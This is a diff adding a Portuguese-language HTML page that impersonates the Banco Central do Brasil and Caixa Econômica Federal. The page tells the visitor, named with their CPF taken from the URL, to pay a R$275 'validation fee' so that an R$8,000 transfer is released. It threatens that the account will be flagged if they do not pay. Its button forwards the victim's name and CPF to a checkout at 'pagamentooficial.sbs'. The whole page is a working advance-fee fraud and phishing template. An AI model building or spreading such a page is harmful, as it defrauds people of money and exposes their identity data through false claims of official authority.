@@ -1,0 +1,139 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banco Central do Brasil - Validação Bancária</title>
+  <script>
+    localStorage.setItem("upsell", "up1");
+  </script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          backgroundImage: {
+            'page-bg': "linear-gradient(90deg, #015ea2, #1875a7, #2586a7, #3498a8)",
+          },
+          colors: {
+            'bc-blue': '#165DA9',
+            'bc-blue-dark': '#155a6b'
+          }
+        }
+      }
+    }
+  </script>
+  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+</head>
+
+<body class="bg-page-bg bg-cover bg-center min-h-screen">
+  <!-- Header -->
+  <header class="bg-white text-white flex items-center justify-center p-2">
+    <div class="w-28 rounded flex items-center justify-center">
+      <img src="images/tele.webp" alt="Logo" class="w-full">
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="max-w-2xl mx-auto px-4 pt-0 pb-2">
+    <!-- Card Container -->
+    <div class="bg-white rounded-lg shadow-lg overflow-hidden mt-4">
+      <!-- Title Section -->
+      <div class="bg-gray-50 p-4 border-b">
+        <h2 class="text-lg font-bold text-gray-800">Validação Bancária</h2>
+      </div>
+
+      <!-- Content Section -->
+      <div class="p-6 space-y-6">
+        <!-- User Introduction -->
+        <div class="text-center">
+          <p class="text-gray-700 leading-relaxed">
+            <span class="font-bold">Sr. (a) <span id="user-name">Nome não informado</span></span>, para garantir a
+            segurança e regularidade da sua transferência, é obrigatório realizar uma validação bancária, conforme as
+            normas da Caixa Econômica Federal.
+        </p></div>
+
+        <!-- CPF (adicionado dinamicamente, opcional) -->
+        <div class="text-center">
+          <p class="text-sm text-gray-600">CPF: <span id="userCPF">---</span></p>
+        </div>
+
+        <!-- Why Validation Section -->
+        <div class="space-y-4">
+          <div class="border-l-4 border-[#165DA9] bg-[#F5F5F5] py-4 pl-4">
+            <h3 class="text-base font-bold text-gray-800 mb-3">Por que a validação é necessária?</h3>
+            <ul class="space-y-2 text-gray-700">
+              <li class="flex items-start space-x-2">
+                <span class="size-1.5 bg-black rounded-full mt-2 flex-shrink-0"></span>
+                <span>Evita transações inválidas ou bloqueios futuros</span>
+              </li>
+              <li class="flex items-start space-x-2">
+                <span class="size-1.5 bg-black rounded-full mt-2 flex-shrink-0"></span>
+                <span>Confirma a autenticidade dos seus dados bancários.</span>
+              </li>
+              <li class="flex items-start space-x-2">
+                <span class="size-1.5 bg-black rounded-full mt-2 flex-shrink-0"></span>
+                <span>Libera sua transferência com total segurança</span>
+              </li>
+              <li class="flex items-start space-x-2">
+                <span class="size-1.5 bg-black rounded-full mt-2 flex-shrink-0"></span>
+                <span>Protege suas informações pessoais e bancárias.</span>
+              </li>
+            </ul>
+          </div>
+        </div>
+
+        <!-- Tax Value -->
+        <div class="text-xl text-center flex items-center justify-center gap-1">
+          <p class="text-gray-700">Valor da Taxa:</p>
+          <p class="font-bold text-[#03BF62]">R$ 275,00</p>
+        </div>
+
+        <!-- Confirmation Text -->
+        <div class="text-center">
+          <p class="text-gray-700">
+            Confirme o pagamento da validação para sua transferência no valor de
+            <span class="font-bold">R$8.000,00</span> ser liberada!
+          </p>
+        </div>
+
+        <!-- Validation Button -->
+        <div class="pt-2">
+          <button onclick="redirecionarParaPagamento()" class="w-full bg-bc-blue hover:bg-bc-blue-dark text-white font-bold py-4 px-6 rounded-lg transition-colors duration-200">
+            VALIDAR AGORA
+          </button>
+        </div>
+
+        <!-- Warning -->
+        <div class="p-2">
+          <p class="text-gray-700 text-sm">
+            <span class="font-bold">Atenção:</span> O não pagamento pode causar o registro de sua conta como irregular,
+            impactando futuras transações financeiras.
+          </p>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    const params = new URLSearchParams(window.location.search)
+
+    const nomeCompleto = params.get("name") || "Nome não informado"
+    const primeiroNome = nomeCompleto.trim().split(" ")[0]
+    const cpf = params.get("document") || ""
+
+    document.querySelector("#user-name").textContent = nomeCompleto
+
+    if (cpf) {
+      const formatCPF = (cpf) =>
+        cpf.replace(/\D/g, "").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
+      document.querySelector("#userCPF").textContent = formatCPF(cpf)
+    }
+
+    function redirecionarParaPagamento() {
+      const baseUrl = "https://pagamentooficial.sbs/checkout/up-10/"
+      const currentParams = new URLSearchParams(window.location.search)
+      window.location.href = `${baseUrl}?${currentParams.toString()}`
+    }
+  </script>
+
+
+</body></html>
